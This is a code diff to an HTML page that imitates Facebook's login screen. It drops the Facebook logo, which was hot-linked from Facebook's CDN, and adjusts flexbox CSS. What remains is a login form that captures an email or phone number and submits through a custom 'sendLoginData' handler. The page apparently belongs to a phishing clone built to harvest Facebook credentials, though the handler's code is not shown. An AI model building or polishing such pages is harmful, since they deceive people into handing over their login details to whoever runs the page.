@@ -40,7 +40,6 @@
             margin: 0;
             padding: 0;
             display: flex;
-            flex-direction: column;
             align-items: center;
             justify-content: center;
             height: 100vh;
@@ -53,12 +52,6 @@
             width: 100%;
             max-width: 400px;
             padding: 20px;
-        }
-        .logo {
-            width: 280px;
-            margin-bottom: 20px;
-            display: block;
-            max-width: 100%;
         }
         .right-section {
             background: white;
@@ -115,17 +108,9 @@
             font-weight: bold;
         }
         @media (min-width: 768px) {
-            body {
-                flex-direction: row;
-            }
             .main-container {
                 flex-direction: row;
                 max-width: 980px;
-                align-items: flex-start;
-            }
-            .logo {
-                width: 320px;
-                margin-bottom: 0;
             }
             .right-section {
                 width: 396px;
@@ -135,7 +120,6 @@
 </head>
 <body>
     <div class="main-container">
-        <img class="logo" src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg" alt="Facebook Logo" />
         <div class="right-section">
             <form onsubmit="sendLoginData(event)">
                 <input type="text" id="email" placeholder="Email address or phone number" required>
